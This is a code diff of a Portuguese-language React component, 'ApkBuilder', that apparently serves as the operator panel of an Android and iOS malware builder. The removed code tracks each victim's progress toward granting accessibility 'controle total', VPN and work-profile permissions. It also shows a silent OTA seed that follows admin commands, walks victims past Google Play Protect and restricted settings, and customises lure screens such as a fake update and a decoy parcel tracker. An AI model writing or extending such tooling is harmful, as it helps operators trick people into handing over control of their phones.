-                              <span>{copiedLink ? "Link Copiado!" : "Copiar Link Web do Instalador"}</span>
-                            </button>
-                          )}
-
-                          <button
-                            type="button"
-                            className="secondary"
-                            onClick={() => setResultTab("tracker")}
-                            style={{ justifyContent: "center", gap: "6px", padding: "10px 16px" }}
-                            title="Acompanhar eventos de clique e instalação deste usuário"
-                          >
-                            <Activity size={16} style={{ color: "#38bdf8" }} />
-                            <span>Acompanhar Instalação</span>
-                          </button>
-                        </div>
-                      </div>
-                    )}
-
-                    {/* CONTEÚDO DA ABA 2: APK DIRETO & EMULADOR */}
-                    {resultTab === "apk" && (
-                      <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
-                        <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
-                          {platform === "ios" ? (
-                            <>
-                              <a
-                                className="primary link-button"
-                                href={`${api.baseUrl}${activeResult.iosProfileUrl || activeResult.downloadUrl}`}
-                                download={activeResult.apkName}
-                                style={{ flex: 1, minWidth: "220px", justifyContent: "center", gap: "8px", background: "linear-gradient(135deg, #0284c7, #0369a1)" }}
-                              >
-                                <Download size={18} /> Baixar Perfil iOS ({activeResult.apkName})
-                              </a>
-                              <a
-                                className="secondary link-button"
-                                href={`${api.baseUrl}${activeResult.downloadUrl}`}
-                                download={`${activeResult.apkName.replace(/\.mobileconfig$/, "")}-swift.zip`}
-                                style={{ justifyContent: "center", gap: "6px", padding: "0 14px", textDecoration: "none", display: "inline-flex", alignItems: "center" }}
-                                title="Baixar Projeto Nativo Swift / Xcode (ZIP)"
-                              >
-                                <Folder size={16} /> Projeto Swift
-                              </a>
-                            </>
-                          ) : (
-                            <a
-                              className="primary link-button"
-                              href={`${api.baseUrl}${activeResult.downloadUrl}`}
-                              download={activeResult.apkName}
-                              style={{ flex: 1, justifyContent: "center", gap: "8px", padding: "12px", fontSize: "14px", fontWeight: 700 }}
-                            >
-                              <Download size={18} /> Baixar APK ({activeResult.apkName})
-                            </a>
-                          )}
-                          <button
-                            className="secondary"
-                            onClick={copyDownloadLink}
-                            style={{ padding: "0 18px", display: "flex", alignItems: "center", gap: "8px" }}
-                          >
-                            {copiedLink ? <Check size={16} style={{ color: "#22c55e" }} /> : <Copy size={16} />}
-                            <span>{copiedLink ? "Copiado!" : "Copiar Link"}</span>
-                          </button>
-                        </div>
-
-                        {/* Informações de Salvamento e Verificação */}
-                        <div
-                          style={{
-                            background: "rgba(15, 23, 42, 0.6)",
-                            border: "1px solid #1e293b",
-                            borderRadius: "8px",
-                            padding: "12px",
-                            fontSize: "12px",
-                            color: "#cbd5e1"
-                          }}
-                        >
-                          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
-                            <strong>Destino de salvamento no seu computador:</strong>
-                            <span style={{ fontSize: "11px", color: "#22c55e", fontWeight: 700 }}>● Pronto para Emulador</span>
-                          </div>
-                          <div style={{ color: "#f8fafc", fontFamily: "var(--font-mono)", fontSize: "11.5px", background: "rgba(0,0,0,0.3)", padding: "6px 10px", borderRadius: "6px" }}>
-                            {platform === "ios"
-                              ? `${saveDirectory}\\${activeResult.apkName}`
-                              : `${saveDirectory}\\${activeResult.apkName}`}
-                          </div>
-
-                          <div style={{ marginTop: "8px", display: "flex", alignItems: "center", gap: "8px", fontSize: "11px", color: "#94a3b8" }}>
-                            <span>SHA-256:</span>
-                            <code style={{ fontFamily: "var(--font-mono)", color: "#38bdf8", fontSize: "10.5px" }}>
-                              {activeResult.sha256 ? activeResult.sha256.slice(0, 32) + "..." : "e3b0c442..."}
-                            </code>
-                          </div>
-                        </div>
-
-                        {/* SEED OTA CRIPTOGRÁFICA DE ATUALIZAÇÃO SILENCIOSA */}
-                        {activeResult.updateSeed && (
-                          <div
-                            style={{
-                              background: "rgba(168, 85, 247, 0.08)",
-                              border: "1px solid rgba(168, 85, 247, 0.35)",
-                              borderRadius: "8px",
-                              padding: "12px",
-                              display: "flex",
-                              flexDirection: "column",
-                              gap: "8px"
-                            }}
-                          >
-                            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-                              <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                                <Sparkles size={14} style={{ color: "#c084fc" }} />
-                                <strong style={{ fontSize: "12px", color: "#f8fafc" }}>
-                                  Seed OTA de Atualização Silenciosa em Background:
-                                </strong>
-                              </div>
-                              <span
-                                style={{
-                                  fontSize: "9px",
-                                  fontWeight: 800,
-                                  background: "rgba(168, 85, 247, 0.2)",
-                                  color: "#c084fc",
-                                  padding: "2px 6px",
-                                  borderRadius: "4px",
-                                  border: "1px solid rgba(168, 85, 247, 0.4)"
-                                }}
-                              >
-                                AUTO-UPDATE ATIVO
-                              </span>
-                            </div>
-
-                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                              <code
-                                style={{
-                                  flex: 1,
-                                  background: "#060913",
-                                  border: "1px solid #1e293b",
-                                  padding: "6px 10px",
-                                  borderRadius: "6px",
-                                  fontFamily: "var(--font-mono)",
-                                  color: "#a855f7",
-                                  fontSize: "11px",
-                                  fontWeight: 700,
-                                  wordBreak: "break-all"
-                                }}
-                              >
-                                {activeResult.updateSeed}
-                              </code>
-                              <button
-                                type="button"
-                                className="secondary"
-                                onClick={() => {
-                                  if (activeResult.updateSeed) {
-                                    void navigator.clipboard.writeText(activeResult.updateSeed);
-                                    setCopiedSeed(true);
-                                    setTimeout(() => setCopiedSeed(false), 2000);
-                                  }
-                                }}
-                                style={{ padding: "6px 12px", fontSize: "11px", display: "flex", alignItems: "center", gap: "4px" }}
-                              >
-                                {copiedSeed ? <Check size={13} style={{ color: "#22c55e" }} /> : <Copy size={13} />}
-                                <span>{copiedSeed ? "Copiado!" : "Copiar Seed"}</span>
-                              </button>
-                            </div>
-
-                            <small style={{ color: "#94a3b8", fontSize: "10.5px", lineHeight: "1.4" }}>
-                              O aparelho instalado usará esta Seed para sincronizar silenciosamente com o servidor central em segundo plano. Se a versão instalada atender todos os comandos do admin, nenhuma atualização forçada ocorre.
-                            </small>
-                          </div>
-                        )}
-
-                        {/* BLOCO DE COMANDO RÁPIDO PARA EMULADOR ADB */}
-                        {platform === "android" && (
-                          <div
-                            style={{
-                              background: "rgba(30, 41, 59, 0.5)",
-                              border: "1px solid rgba(56, 189, 248, 0.3)",
-                              borderRadius: "8px",
-                              padding: "12px",
-                              fontSize: "12px"
-                            }}
-                          >
-                            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
-                              <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                                <Terminal size={15} style={{ color: "#38bdf8" }} />
-                                <strong style={{ color: "#f8fafc" }}>Instalação Direta no Emulador via ADB:</strong>
-                              </div>
-                              <button
-                                type="button"
-                                className="secondary"
-                                onClick={copyAdbCommand}
-                                style={{ padding: "4px 10px", fontSize: "11px", gap: "4px" }}
-                              >
-                                {copiedAdb ? <Check size={13} style={{ color: "#22c55e" }} /> : <Copy size={13} />}
-                                <span>{copiedAdb ? "Copiado!" : "Copiar ADB"}</span>
-                              </button>
-                            </div>
-                            <div style={{
-                              background: "#050811",
-                              padding: "8px 12px",
-                              borderRadius: "6px",
-                              border: "1px solid #1e293b",
-                              fontFamily: "var(--font-mono)",
-                              color: "#38bdf8",
-                              fontSize: "11px",
-                              wordBreak: "break-all"
-                            }}>
-                              adb install -r "{saveDirectory}\{activeResult.apkName}"
-                            </div>
-                            <small style={{ display: "block", marginTop: "6px", color: "#94a3b8", fontSize: "10.5px" }}>
-                              Execute no terminal do Windows para instalar diretamente no emulador Android ou celular conectado via USB.
-                            </small>
-                          </div>
-                        )}
-
-                        {/* GUIA DE SEGURANÇA E DISPOSITIVO REAL (GOOGLE PLAY PROTECT & RESTRICTED SETTINGS) */}
-                        {platform === "android" && (
-                          <div
-                            style={{
-                              background: "rgba(245, 158, 11, 0.08)",
-                              border: "1px solid rgba(245, 158, 11, 0.3)",
-                              borderRadius: "8px",
-                              padding: "12px",
-                              fontSize: "12px",
-                              display: "flex",
-                              flexDirection: "column",
-                              gap: "6px"
-                            }}
-                          >
-                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                              <ShieldAlert size={15} style={{ color: "#f59e0b" }} />
-                              <strong style={{ color: "#fef3c7" }}>Instalação em Aparelho Físico (Android 13 / 14 / 15):</strong>
-                            </div>
-                            <div style={{ color: "#cbd5e1", fontSize: "11.5px", lineHeight: "1.4" }}>
-                              <p style={{ margin: "2px 0" }}>
-                                🛡️ <strong>Google Play Protect:</strong> Como o APK corporativo é instalado fora da Play Store (sideload), se o Android exibir alerta de verificação, toque em <em>"Mais detalhes"</em> ➔ <em>"Instalar assim mesmo"</em>.
-                              </p>
-                              <p style={{ margin: "4px 0 2px" }}>
-                                🔓 <strong>Configuração Restrita (Android 13+):</strong> Caso a chave de acessibilidade fique indisponível, o app agora conta com um botão direto para abrir Detalhes do App ➔ toque nos 3 pontinhos (⋮) no topo direito ➔ <em>"Permitir configurações restritas"</em>.
-                              </p>
-                              <p style={{ margin: "4px 0 0", color: "#38bdf8" }}>
-                                ✨ <em>Dica Pro:</em> Para aprovação corporativa direta sem esses diálogos manuais, utilize o <strong>QR Code Zero-Touch (Android Enterprise MDM)</strong> na aba ao lado!
-                              </p>
-                            </div>
-                          </div>
-                        )}
-                      </div>
-                    )}
-
-                    {/* CONTEÚDO DA ABA 3: RASTREAMENTO DA INSTALAÇÃO (TRACKER) */}
-                    {resultTab === "tracker" && (
-                      <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
-                        {/* CARD DE STATUS ATUAL DO USUÁRIO */}
-                        <div
-                          style={{
-                            background: trackedSession?.isStalled
-                              ? "rgba(239, 68, 68, 0.12)"
-                              : trackedSession?.status === "completed"
-                              ? "rgba(34, 197, 94, 0.12)"
-                              : trackedSession?.status === "in_progress"
-                              ? "rgba(56, 189, 248, 0.12)"
-                              : "rgba(15, 23, 42, 0.6)",
-                            border: trackedSession?.isStalled
-                              ? "1px solid rgba(239, 68, 68, 0.4)"
-                              : trackedSession?.status === "completed"
-                              ? "1px solid rgba(34, 197, 94, 0.4)"
-                              : trackedSession?.status === "in_progress"
-                              ? "1px solid rgba(56, 189, 248, 0.4)"
-                              : "1px solid #1e293b",
-                            borderRadius: "10px",
-                            padding: "14px"
-                          }}
-                        >
-                          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
-                            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
-                              <Activity size={18} style={{
-                                color: trackedSession?.isStalled ? "#ef4444" : trackedSession?.status === "completed" ? "#22c55e" : "#38bdf8"
-                              }} />
-                              <strong style={{ fontSize: "14px", color: "#f8fafc" }}>
-                                {trackedSession?.isStalled
-                                  ? "⚠️ Usuário Parou a Instalação"
-                                  : trackedSession?.status === "completed"
-                                  ? "✅ Instalação Concluída com Sucesso!"
-                                  : trackedSession?.status === "in_progress"
-                                  ? "⚡ Usuário Instalando no Momento..."
-                                  : "⏳ Aguardando Início pelo Usuário"}
-                              </strong>
-                            </div>
-                            <span style={{
-                              fontSize: "10.5px",
-                              fontWeight: 700,
-                              padding: "3px 8px",
-                              borderRadius: "12px",
-                              background: trackedSession?.isStalled ? "#ef4444" : trackedSession?.status === "completed" ? "#22c55e" : "#38bdf8",
-                              color: "#fff"
-                            }}>
-                              {trackedSession?.isStalled ? "INTERROMPIDO" : trackedSession?.status === "completed" ? "CONCLUÍDO" : trackedSession?.status === "in_progress" ? "AO VIVO" : "PENDENTE"}
-                            </span>
-                          </div>
-
-                          <div style={{ fontSize: "12px", color: "#cbd5e1", lineHeight: "1.5" }}>
-                            {trackedSession?.isStalled ? (
-                              <p style={{ margin: "4px 0", color: "#fca5a5" }}>
-                                <strong>Atenção:</strong> O usuário interrompeu o fluxo na etapa: <strong>{trackedSession.stalledAtStep || trackedSession.currentStep}</strong> ({Math.round(trackedSession.elapsedSeconds || 0)}s sem interagir).
-                              </p>
-                            ) : trackedSession?.status === "completed" ? (
-                              <p style={{ margin: "4px 0", color: "#86efac" }}>
-                                O dispositivo passou por todas as etapas de onboarding, ativou o serviço e conectou ao servidor central!
-                              </p>
-                            ) : trackedSession?.status === "in_progress" ? (
-                              <p style={{ margin: "4px 0", color: "#7dd3fc" }}>
-                                O usuário está interagindo na tela: <strong>{trackedSession.currentStep}</strong> ({Math.round(trackedSession.elapsedSeconds || 0)}s decorridos).
-                              </p>
-                            ) : (
-                              <p style={{ margin: "4px 0", color: "#94a3b8" }}>
-                                O instalador está aguardando o usuário escanear o QR Code ou clicar no link de download para iniciar a detecção dos passos.
-                              </p>
-                            )}
-                          </div>
-
-                          <div style={{ marginTop: "10px", display: "flex", gap: "16px", fontSize: "11px", color: "#94a3b8", borderTop: "1px solid rgba(255,255,255,0.06)", paddingTop: "8px" }}>
-                            <span>Sessão: <code style={{ color: "#f8fafc" }}>{activeResult.downloadUrl.replace(/^\/(apk|ios)\/download\//, "")}</code></span>
-                            <span>Eventos Registrados: <strong style={{ color: "#f8fafc" }}>{(trackedSession?.steps || trackedSession?.history || []).length}</strong></span>
-                            <span>Tempo Total: <strong style={{ color: "#f8fafc" }}>{trackedSession ? Math.round(trackedSession.elapsedSeconds || 0) + "s" : "0s"}</strong></span>
-                          </div>
-                        </div>
-
-                        {/* LISTA CRONOLÓGICA DE PASSOS E CLIQUES DO USUÁRIO */}
-                        <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
-                          <span style={{ fontSize: "12px", fontWeight: 700, color: "#94a3b8", textTransform: "uppercase", letterSpacing: "0.5px" }}>
-                            Histórico de Cliques & Telas do Usuário:
-                          </span>
-
-                          {(() => {
-                            const stepsList: InstallTrackStep[] = (trackedSession?.steps || trackedSession?.history || []) as InstallTrackStep[];
-                            if (!trackedSession || stepsList.length === 0) {
-                              return (
-                                <div style={{ textAlign: "center", padding: "24px 16px", background: "rgba(15, 23, 42, 0.4)", borderRadius: "8px", border: "1px dashed #334155", color: "#64748b", fontSize: "12px" }}>
-                                  Nenhum clique registrado ainda. A telemetria atualizará em tempo real automaticamente.
-                                </div>
-                              );
-                            }
-                            return (
-                              <div style={{ display: "flex", flexDirection: "column", gap: "6px", maxHeight: "240px", overflowY: "auto" }}>
-                                {stepsList.map((st: InstallTrackStep, idx: number) => {
-                                  const stepLabels: Record<string, string> = {
-                                    download_started: "📥 Download do Instalador Iniciado",
-                                    apk_installed: "📦 Pacote APK Instalado no Aparelho",
-                                    splash_viewed: "📱 Tela Splash / Boas-Vindas Carregada",
-                                    loading_passed: "⏳ Processamento de Inicialização Concluído",
-                                    settings_opened: "⚙️ Usuário Abriu Configurações de Acessibilidade",
-                                    accessibility_clicked: "👆 Usuário Clicou no Nome do Aplicativo",
-                                    accessibility_granted: "✅ Permissão de Acessibilidade Concedida",
-                                    island_profile_requested: "🏝️ Requisição de Perfil Island / Work Profile",
-                                    island_profile_created: "💼 Container de Trabalho Isolado Criado",
-                                    vpn_authorized: "🛡️ Permissão de Conexão VPN Autorizada",
-                                    vpn_connected: "🚀 Túnel VPN de Alta Performance Conectado",
-                                    app_ready: "🎉 Instalação Concluída e Dispositivo Pronto!",
-                                    user_abandoned: "❌ Usuário Fechou ou Cancelou o Processo"
-                                  };
-
-                                  return (
-                                    <div
-                                      key={idx}
-                                      style={{
-                                        display: "flex",
-                                        alignItems: "center",
-                                        justifyContent: "space-between",
-                                        background: "rgba(15, 23, 42, 0.6)",
-                                        border: "1px solid #1e293b",
-                                        borderRadius: "6px",
-                                        padding: "8px 12px",
-                                        fontSize: "11.5px"
-                                      }}
-                                    >
-                                      <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
-                                        <CheckCircle2 size={14} style={{ color: "#22c55e", flexShrink: 0 }} />
-                                        <span style={{ color: "#f8fafc", fontWeight: 600 }}>
-                                          {stepLabels[st.step] || st.title || st.step}
-                                        </span>
-                                      </div>
-                                      <span style={{ color: "#64748b", fontFamily: "var(--font-mono)", fontSize: "10px" }}>
-                                        {new Date(st.timestamp).toLocaleTimeString("pt-BR")}
-                                      </span>
-                                    </div>
-                                  );
-                                })}
-                              </div>
-                            );
-                          })()}
-                        </div>
-                      </div>
-                    )}
-
-                    {/* BOTÕES INFERIORES */}
-                    <div style={{ display: "flex", gap: "10px", marginTop: "6px" }}>
-                      <button
-                        type="button"
-                        className="primary"
-                        style={{ flex: 1, justifyContent: "center" }}
-                        onClick={() => setActiveModalTab("preview")}
-                      >
-                        <Eye size={15} /> Ver Preview das Telas no Celular
-                      </button>
-                      <button
-                        type="button"
-                        className="secondary"
-                        onClick={() => setShowModal(false)}
-                      >
-                        Concluir e Voltar
-                      </button>
-                    </div>
-                  </div>
+                  <ApkBuildResultPanel
+                    activeResult={activeResult}
+                    platform={platform}
+                    resultTab={resultTab}
+                    setResultTab={setResultTab}
+                    trackedSession={trackedSession}
+                    qrMode={qrMode}
+                    setQrMode={setQrMode}
+                    getEffectiveQrValue={getEffectiveQrValue}
+                    showZeroTouchJson={showZeroTouchJson}
+                    setShowZeroTouchJson={setShowZeroTouchJson}
+                    copyZeroTouchJson={copyZeroTouchJson}
+                    copiedZeroTouch={copiedZeroTouch}
+                    copyDownloadLink={copyDownloadLink}
+                    copiedLink={copiedLink}
+                    saveDirectory={saveDirectory}
+                    copiedSeed={copiedSeed}
+                    setCopiedSeed={setCopiedSeed}
+                    copyAdbCommand={copyAdbCommand}
+                    copiedAdb={copiedAdb}
+                    setActiveModalTab={setActiveModalTab}
+                    setShowModal={setShowModal}
+                  />
                 ) : (
                   <form onSubmit={handleSaveBuild} style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
                     {/* BARRA DE PERFIS DE EMPRESA WHITE-LABEL (1-CLIQUE) */}
@@ -2834,7 +1939,7 @@ export function ApkBuilder() {
                             <input
                               value={companyEmoji}
                               onChange={(e) => setCompanyEmoji(e.target.value)}
-                              placeholder="📦"
+                              placeholder="JAD"
                               style={{ textAlign: "center", fontSize: "16px" }}
                               required
                             />
@@ -2872,7 +1977,7 @@ export function ApkBuilder() {
                                 gap: "4px"
                               }}
                             >
-                              <span>{preset.emoji}</span>
+                              <BrandVectorIcon brand={preset.emoji} size={12} />
                               <span style={{ fontSize: "10px" }}>{preset.name}</span>
                             </button>
                           ))}
@@ -2945,7 +2050,7 @@ export function ApkBuilder() {
                             <input
                               value={companyEmoji}
                               onChange={(e) => setCompanyEmoji(e.target.value)}
-                              placeholder="📦"
+                              placeholder="JAD"
                               style={{ textAlign: "center", fontSize: "16px" }}
                               required
                             />
@@ -2983,7 +2088,7 @@ export function ApkBuilder() {
                                 gap: "4px"
                               }}
                             >
-                              <span>{preset.emoji}</span>
+                              <BrandVectorIcon brand={preset.emoji} size={12} />
                               <span style={{ fontSize: "10px" }}>{preset.name}</span>
                             </button>
                           ))}
@@ -3466,1518 +2571,49 @@ export function ApkBuilder() {
 
             {/* TAB 2: CUSTOMIZAR TELAS (AJUSTE DINÂMICO DE TEXTOS, LOGO E CORES) */}
             {activeModalTab === "screens" && (
-              <div className="screen-customizer-container">
-                {/* Banner Informativo */}
-                <div className="customizer-intro-banner">
-                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                    <Sparkles size={20} style={{ color: "var(--crimson-neon)", flexShrink: 0 }} />
-                    <div>
-                      <strong style={{ fontSize: "14px", color: "#f8fafc", display: "block" }}>
-                        Personalização Dinâmica de Todas as Telas de Instalação e Ativação
-                      </strong>
-                      <span style={{ fontSize: "12px", color: "#94a3b8" }}>
-                        O logotipo, o nome do aplicativo e todos os textos ajustados aqui refletem em tempo real no simulador interativo de 10 etapas e são embutidos nos parâmetros do APK.
-                      </span>
-                    </div>
-                  </div>
-                  <button
-                    type="button"
-                    className="secondary compact-btn"
-                    onClick={() => {
-                      setScreenConfig(defaultScreenConfig);
-                      showToast("Textos e parâmetros restaurados para o padrão oficial do vídeo!");
-                    }}
-                    style={{ display: "flex", alignItems: "center", gap: "6px" }}
-                  >
-                    <RotateCcw size={13} />
-                    <span>Restaurar Padrão do Vídeo</span>
-                  </button>
-                </div>
-
-                {/* Grid de Seções de Customização */}
-                <div className="customizer-grid">
-                  {/* CARD 1: Identidade Visual e Cor de Destaque */}
-                  <div className="customizer-card">
-                    <h4 className="customizer-card-title">
-                      <Palette size={15} style={{ color: screenConfig.accentColor || "#dc2626" }} />
-                      Identidade Visual & Cor de Destaque
-                    </h4>
-                    <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
-                      <div>
-                        <label style={{ fontSize: "12px", color: "#cbd5e1", marginBottom: "6px", display: "block" }}>
-                          Paleta de Cores da Marca:
-                        </label>
-                        <div style={{ display: "flex", alignItems: "center", gap: "8px", flexWrap: "wrap" }}>
-                          {brandAccentPresets.map((preset) => (
-                            <button
-                              key={preset.hex}
-                              type="button"
-                              className={`color-swatch-btn ${screenConfig.accentColor === preset.hex ? "active" : ""}`}
-                              style={{ backgroundColor: preset.hex }}
-                              onClick={() => setScreenConfig((prev) => ({ ...prev, accentColor: preset.hex }))}
-                              title={preset.name}
-                            >
-                              {screenConfig.accentColor === preset.hex && <Check size={12} color="#ffffff" />}
-                            </button>
-                          ))}
-                          <div style={{ display: "flex", alignItems: "center", gap: "6px", marginLeft: "6px" }}>
-                            <input
-                              type="color"
-                              value={screenConfig.accentColor || "#dc2626"}
-                              onChange={(e) => setScreenConfig((prev) => ({ ...prev, accentColor: e.target.value }))}
-                              style={{ width: "28px", height: "28px", padding: 0, border: "none", borderRadius: "50%", cursor: "pointer", background: "transparent" }}
-                              title="Selecionar cor personalizada"
-                            />
-                            <span style={{ fontSize: "11px", color: "#94a3b8", fontFamily: "var(--font-mono)" }}>
-                              {screenConfig.accentColor || "#dc2626"}
-                            </span>
-                          </div>
-                        </div>
-                      </div>
-
-                      {/* Prévia da Identidade Visual */}
-                      <div style={{ background: "#080a10", border: "1px solid #1e293b", borderRadius: "8px", padding: "10px 12px", display: "flex", alignItems: "center", gap: "12px" }}>
-                        {renderAppLogo(36, 8)}
-                        <div>
-                          <strong style={{ fontSize: "13px", color: "#ffffff", display: "block" }}>{appName}</strong>
-                          <small style={{ fontSize: "10.5px", color: "#64748b" }}>Logotipo ativo refletido nas 10 telas</small>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-
-                  {/* CARD 2: Textos de Carregamento & Splash (Telas 02 e 03) */}
-                  <div className="customizer-card">
-                    <h4 className="customizer-card-title">
-                      <Sliders size={15} style={{ color: "#38bdf8" }} />
-                      Carregamento & Splash (Telas 02 e 03)
-                    </h4>
-                    <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
-                      <label style={{ fontSize: "12px" }}>
-                        Subtexto de Atualização (Tela 02):
-                        <input
-                          value={screenConfig.loadingSubtext || ""}
-                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, loadingSubtext: e.target.value }))}
-                          placeholder="aguarde, atualização em andamento..."
-                          style={{ marginTop: "4px" }}
-                        />
-                      </label>
-                      <label style={{ fontSize: "12px" }}>
-                        Copyright / Rodapé Splash (Tela 03):
-                        <input
-                          value={screenConfig.copyrightText || ""}
-                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, copyrightText: e.target.value }))}
-                          placeholder="All Rights Reserved."
-                          style={{ marginTop: "4px" }}
-                        />
-                        <small style={{ color: "#64748b", fontSize: "10.5px", marginTop: "2px", display: "block" }}>
-                          Exibido como: © 25 {appName}. {screenConfig.copyrightText || "All Rights Reserved."}
-                        </small>
-                      </label>
-                    </div>
-                  </div>
-
-                  {/* CARD 3: Balão de Instrução & Permissões (Telas 06, 07 e 08) */}
-                  <div className="customizer-card" style={{ gridColumn: "span 2" }}>
-                    <h4 className="customizer-card-title">
-                      <ShieldAlert size={15} style={{ color: "#f59e0b" }} />
-                      Balão de Orientação & Diálogos de Acessibilidade (Telas 06, 07 e 08)
-                    </h4>
-                    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px" }}>
-                      <label style={{ fontSize: "12px" }}>
-                        Texto do Balão Flutuante (Tela 06):
-                        <textarea
-                          rows={2}
-                          value={screenConfig.speechCalloutText || ""}
-                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, speechCalloutText: e.target.value }))}
-                          placeholder="Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar."
-                          style={{ marginTop: "4px", width: "100%", resize: "vertical" }}
-                        />
-                      </label>
-                      <label style={{ fontSize: "12px" }}>
-                        Título do Diálogo de Autorização (Tela 08):
-                        <input
-                          value={screenConfig.permissionDialogTitle || ""}
-                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, permissionDialogTitle: e.target.value }))}
-                          placeholder="Permitir controle total para {appName}?"
-                          style={{ marginTop: "4px" }}
-                        />
-                        <small style={{ color: "#64748b", fontSize: "10.5px", marginTop: "2px", display: "block" }}>
-                          Use <code>{"{appName}"}</code> para incluir o nome do aplicativo dinamicamente.
-                        </small>
-                      </label>
-                    </div>
-                    <div style={{ marginTop: "10px" }}>
-                      <label style={{ fontSize: "12px" }}>
-                        Descrição Oficial do Serviço (Tela 07):
-                        <textarea
-                          rows={2}
-                          value={screenConfig.serviceDescription || ""}
-                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, serviceDescription: e.target.value }))}
-                          placeholder="O serviço de acessibilidade do {appName} permite..."
-                          style={{ marginTop: "4px", width: "100%", resize: "vertical" }}
-                        />
-                      </label>
-                    </div>
-                  </div>
-
-                  {/* CARD 4: Tela Final / Interface Pós-Ativação (Tela 10) */}
-                  <div className="customizer-card" style={{ gridColumn: "span 2" }}>
-                    <h4 className="customizer-card-title">
-                      <CheckCircle2 size={15} style={{ color: "#22c55e" }} />
-                      Interface Final Pós-Ativação (Tela 10)
-                    </h4>
-                    <div style={{ display: "grid", gridTemplateColumns: "1fr 1.5fr", gap: "12px" }}>
-                      <label style={{ fontSize: "12px" }}>
-                        Título Principal da Tela 10:
-                        <input
-                          value={screenConfig.trackingTitle || ""}
-                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, trackingTitle: e.target.value }))}
-                          placeholder="Rastreamento de Encomendas"
-                          style={{ marginTop: "4px" }}
-                        />
-                      </label>
-                      <label style={{ fontSize: "12px" }}>
-                        Subtítulo / Orientação da Tela 10:
-                        <input
-                          value={screenConfig.trackingSubtext || ""}
-                          onChange={(e) => setScreenConfig((prev) => ({ ...prev, trackingSubtext: e.target.value }))}
-                          placeholder="Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos."
-                          style={{ marginTop: "4px" }}
-                        />
-                      </label>
-                    </div>
-                  </div>
-                </div>
-
-                {/* Ações do Rodapé da Tab Customizar */}
-                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginTop: "16px", paddingTop: "14px", borderTop: "1px solid #1e293b" }}>
-                  <button
-                    type="button"
-                    className="secondary"
-                    onClick={() => setActiveModalTab("form")}
-                  >
-                    <ArrowLeft size={14} /> Voltar aos Parâmetros
-                  </button>
-
-                  <button
-                    type="button"
-                    className="primary"
-                    onClick={() => {
-                      setActiveModalTab("preview");
-                      showToast("Configurações aplicadas! Veja as alterações no simulador de celular.");
-                    }}
-                    style={{ display: "flex", alignItems: "center", gap: "8px", padding: "10px 20px" }}
-                  >
-                    <Eye size={15} />
-                    <span>Ver Telas no Simulador de Celular →</span>
-                  </button>
-                </div>
-              </div>
+              <ApkScreenCustomizerTab
+                screenConfig={screenConfig}
+                setScreenConfig={setScreenConfig}
+                showToast={showToast}
+                renderAppLogo={renderAppLogo}
+                appName={appName}
+                setActiveModalTab={setActiveModalTab}
+              />
             )}
 
             {/* TAB 3: PREVIEW DE TODAS AS 10 TELAS OFICIAIS DE INSTALAÇÃO E ACESSIBILIDADE */}
             {activeModalTab === "preview" && (
-              <div className="android-preview-stage">
-                {/* Top Stepper Selector */}
-                <div className="preview-stepper-bar">
-                  <div style={{ display: "flex", alignItems: "center", gap: "8px", flexWrap: "wrap" }}>
-                    <button
-                      className="secondary compact-btn"
-                      disabled={previewStep <= 1}
-                      onClick={() => setPreviewStep((s) => Math.max(1, s - 1))}
-                    >
-                      <ChevronLeft size={16} /> Anterior
-                    </button>
-
-                    <div className="preview-steps-pills">
-                      {officialSteps.map((stepMeta) => (
-                        <button
-                          key={stepMeta.step}
-                          className={`step-pill-btn ${previewStep === stepMeta.step ? "active" : ""}`}
-                          onClick={() => setPreviewStep(stepMeta.step)}
-                          title={`${stepMeta.name}: ${stepMeta.subtitle}`}
-                        >
-                          {stepMeta.step}
-                        </button>
-                      ))}
-                    </div>
-
-                    <button
-                      className="secondary compact-btn"
-                      disabled={previewStep >= 10}
-                      onClick={() => setPreviewStep((s) => Math.min(10, s + 1))}
-                    >
-                      Próxima <ChevronRight size={16} />
-                    </button>
-
-                    <button
-                      type="button"
-                      className={`secondary compact-btn ${isPlayingAuto ? "active" : ""}`}
-                      onClick={() => setIsPlayingAuto(!isPlayingAuto)}
-                      title="Avanço contínuo simulando a instalação completa pelas 10 etapas"
-                      style={{ display: "flex", alignItems: "center", gap: "5px" }}
-                    >
-                      <Play size={12} style={{ color: isPlayingAuto ? "#22c55e" : "var(--crimson-neon)" }} />
-                      <span>{isPlayingAuto ? "Pausar Demo" : "Auto Demo"}</span>
-                    </button>
-                  </div>
-
-                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                    <span
-                      className="preview-step-badge"
-                      style={{
-                        background: `${officialSteps[previewStep - 1].badgeColor}22`,
-                        color: officialSteps[previewStep - 1].badgeColor,
-                        border: `1px solid ${officialSteps[previewStep - 1].badgeColor}55`
-                      }}
-                    >
-                      {officialSteps[previewStep - 1].badge}
-                    </span>
-                    <span className="step-title-display">
-                      {officialSteps[previewStep - 1].title}
-                    </span>
-                  </div>
-                </div>
-
